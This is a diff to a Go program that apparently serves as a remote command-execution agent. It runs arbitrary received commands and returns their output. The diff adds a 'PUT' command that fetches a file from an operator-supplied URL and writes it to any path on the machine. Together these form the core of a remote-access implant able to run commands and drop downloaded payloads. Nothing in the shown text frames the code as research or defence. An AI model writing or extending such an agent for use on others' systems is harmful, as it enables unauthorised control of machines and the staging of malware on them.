@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/tls"
+	"fmt"
 	"io"
 	"net/http"
 	"net/url"
@@ -87,11 +88,51 @@ func sendResponse(result string) {
 
 func execute(cmd string) string {
 	parts := strings.Fields(cmd)
+	if len(parts) == 0 {
+		return ""
+	}
+	if len(parts) >= 1 && strings.ToUpper(parts[0]) == "PUT" {
+		if len(parts) < 3 {
+			return "PUT usage: PUT <url> <dest_path>"
+		}
+		return handlePut(parts[1], strings.Join(parts[2:], " "))
+	}
 	out, err := exec.Command(parts[0], parts[1:]...).CombinedOutput()
 	if err != nil {
 		return err.Error() + ": " + string(out)
 	}
 	return string(out)
+}
+
+func handlePut(fileURL string, destPath string) string {
+	resp, err := client.Get(fileURL)
+	if err != nil {
+		return "download error: " + err.Error()
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Sprintf("download failed: status %d", resp.StatusCode)
+	}
+	// ensure parent dirs exist
+	if err := os.MkdirAll(dirOf(destPath), 0755); err != nil {
+		// try 0755, cross-platform; ignored on Windows
+	}
+	data, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "read error: " + err.Error()
+	}
+	if err := os.WriteFile(destPath, data, 0644); err != nil {
+		return "write error: " + err.Error()
+	}
+	return "PUT ok: " + destPath
+}
+
+func dirOf(path string) string {
+	idx := strings.LastIndexAny(path, "/\\")
+	if idx <= 0 {
+		return "."
+	}
+	return path[:idx]
 }
 
 func main() {
